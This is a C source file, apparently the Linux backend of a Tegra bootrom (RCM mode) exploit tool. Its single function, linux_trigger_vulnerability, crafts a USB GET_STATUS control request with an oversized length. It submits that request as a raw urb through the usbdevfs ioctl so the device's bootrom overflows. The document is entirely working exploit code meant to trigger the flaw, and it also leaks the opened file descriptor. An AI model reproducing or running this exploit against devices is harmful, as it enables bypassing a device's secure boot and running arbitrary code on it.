#include <stdlib.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <fcntl.h>
#include <errno.h>

#include <linux/usb/ch9.h>
#include <linux/usbdevice_fs.h>
#include <sys/ioctl.h>

#include <libusb.h>

#include "tegra.h"
#include "util.h"

#include "backend.h"

#define SETUP_PACKET_SIZE 8
#define IOCTL_IOR 0x80000000
#define IOCTL_NR_SUBMIT_URB 10

int linux_trigger_vulnerability(tegra_handle* handle, uint16_t length)
{
    libusb_device* device = libusb_get_device(handle->usb_handle);

    const uint16_t blength = swap_little_16(length);

    const uint8_t ublength = (const uint8_t)(blength & 0xFF);
    const uint8_t lblength = (const uint8_t)(blength >> 8);

    uint8_t setup_packet[8] = {
        USB_ENDPOINT_DIR_MASK | USB_RECIP_ENDPOINT,
        USB_REQ_GET_STATUS,
        0x00, 0x00,
        0x00, 0x00,
        ublength, lblength,
    };

    const size_t buffer_size = ARRAY_LEN(setup_packet) + length;
    uint8_t *buffer = malloc(buffer_size);

    memcpy(buffer, setup_packet, ARRAY_LEN(setup_packet));

    uint8_t bus = libusb_get_bus_number(device);
    uint8_t address = libusb_get_device_address(device);

    char bus_path[24];
    sprintf(bus_path, "/dev/bus/usb/%03d/%03d", bus, address);

    int r = open(bus_path, O_RDWR);
    if (r >= 0)
    {
        struct usbdevfs_urb request;
        memset(&request, 0, sizeof(request));

        request.type = USBDEVFS_URB_TYPE_CONTROL;
        request.endpoint = 0x00;
        request.buffer = buffer;
        request.buffer_length = (int)buffer_size;

        r = ioctl(r, USBDEVFS_SUBMITURB, &request);
    }

    free(buffer);

    return r;
}
